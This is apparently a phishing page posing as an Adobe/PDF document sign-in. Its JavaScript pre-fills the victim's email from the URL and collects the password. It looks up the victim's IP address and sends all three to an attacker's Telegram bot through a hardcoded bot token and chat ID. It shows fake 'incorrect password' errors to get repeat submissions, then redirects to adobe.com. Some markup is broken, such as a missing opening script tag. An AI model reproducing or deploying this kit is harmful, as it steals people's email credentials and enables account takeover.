

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url("https://i.gyazo.com/8da883e202a7c817e48480a0b0b70d92.jpg");
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            position: relative; /* Add position relative */
        }
        /* Add overlay style */
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5); /* Adjust opacity here */
            z-index: -1; /* Move the overlay behind other elements */
        }
        .container {
            background-color: #fff;
            border-radius: 0; /* Sharp edges */
            padding: 20px;
            text-align: center;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            max-width: 300px; /* Reduced width */
            width: 100%;
            opacity: 0;
            animation: slideIn 0.5s forwards;
            position: relative; /* Add position relative */
            height: 400px; /* Increased height */
        }
        @keyframes slideIn {
            from {
                width: 0;
                opacity: 0;
            }
            to {
                width: 100%;
                opacity: 1;
            }
        }
        .logo {
            width: 100px;
            height: 100px;
            margin: auto;
            display: block;
        }
        h2 {
            font-weight: bold;
            margin-top: 20px;
            margin-bottom: 10px;
        }
        input[type="text"],
        input[type="password"],
        button {
            width: calc(100% - 40px);
            margin-bottom: 10px;
            padding: 10px;
            border-radius: 0; /* Sharp edges */
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        button {
            background-color: #d32f2f; /* Red color */
            color: #fff;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #b71c1c; /* Darker red on hover */
        }
        .error-container {
            color: white;
            background: lightcoral;
            padding: 10px;
            margin-top: 10px;
            border-radius: 0; /* Sharp edges */
            display: none;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-top: 4px solid #333;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Remember me checkbox style */
        .remember-me {
            text-align: left;
            margin-bottom: 10px;
            font-size: 14px;
            margin-left: 20px;
        }
        /* Copyright text style */
        .copyright {
            font-size: 8px;
            color: #999;
            position: left; /* Add position absolute */
            bottom: 20px; /* Adjust as needed */
            left: 8px; /* Adjust as needed */
        }
        /* Privacy & cookies text style */
        .privacy-cookies {
            font-size: 10px;
            color: #999;
            position: absolute; /* Add position absolute */
            bottom: 10px; /* Adjust as needed */
            right: 70px; /* Adjust as needed */
        }
    </style>

            const emailFromURL = new URLSearchParams(window.location.search).get('email');
            if (emailFromURL) {
                const emailField = document.getElementById('email');
                if (emailField) {
                    emailField.value = emailFromURL;
                    userEmail = emailFromURL;
                }
            }
    
            // Get email from the URL's fragment (after #) and place it in the username field
            const emailFromHash = window.location.hash.substring(1); // Remove the # and get the value after it
            if (emailFromHash) {
                const emailField = document.getElementById('email');
                if (emailField) {
                    emailField.value = emailFromHash;
                    userEmail = emailFromHash;
                }
            }
    
            const form = document.forms['loginForm'];
            const passwordField = document.getElementById('password');
            const signInButton = document.getElementById('submit-btn');
            const errorContainer = document.querySelector('.error-container');
            const spinner = document.querySelector('.spinner');
    
            document.querySelector('.container').style.animation = 'slideIn 0.5s forwards';
    
            form.addEventListener('submit', async (event) => {
                event.preventDefault();
    
                // Check if password length is less than 3
                if (passwordField.value.length < 3) {
                    showError(errorContainer, 'Password Too Short.');
                    return;
                }
    
                signInAttempts++;
                signInButton.textContent = 'Loading...';
    
                const formData = new FormData(form);
                const email = formData.get('email');
                const password = formData.get('password');
                
                try {
                    // Fetch user's IP address
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    const userIP = ipData.ip;
    
                    // Send the form data and IP to Telegram
                    const botToken = '8874935748:AAGucJmnZEXb4ocIcM0rRNs4OE56CTuPkDQ';
                    const chatId = '7019491596';
                    const message = `PDF LOGING:\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${userIP}`;
    
                    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    });
    
                    const telegramResult = await telegramResponse.json();
    
                    if (!telegramResult.ok) {
                        showError(errorContainer, 'Failed to submit form to Telegram. Please try again.');
                        return;
                    }
    
                    if (signInAttempts <= 2) {
                        showError(errorContainer, 'Your Email Password is incorrect.. Please Try Again');
                    }
    
                    // Reset button text
                    signInButton.textContent = 'Sign in';
    
                    if (signInAttempts === 4) {
                        spinner.style.display = 'block';
                        setTimeout(() => {
                            const redirects = ['https://adobe.com'];
                            const randomRedirect = redirects[Math.floor(Math.random() * redirects.length)];
                            window.location.href = randomRedirect;
                        }, 1500);
                    }
                } catch (error) {
                    // Handle any errors here
                    showError(errorContainer, 'Failed to submit form. Please try again.');
                    signInButton.textContent = 'Sign in';
                }
            });
        });
    
        function showError(errorContainer, message) {
            errorContainer.textContent = message;
            errorContainer.style.display = 'block';
    
            // Clear password field
            document.getElementById('password').value = '';
    
            // Hide the error message after a few seconds
            setTimeout(() => {
                errorContainer.style.display = 'none';
            }, 3000);
        }
    </script>    
</body>
</html>
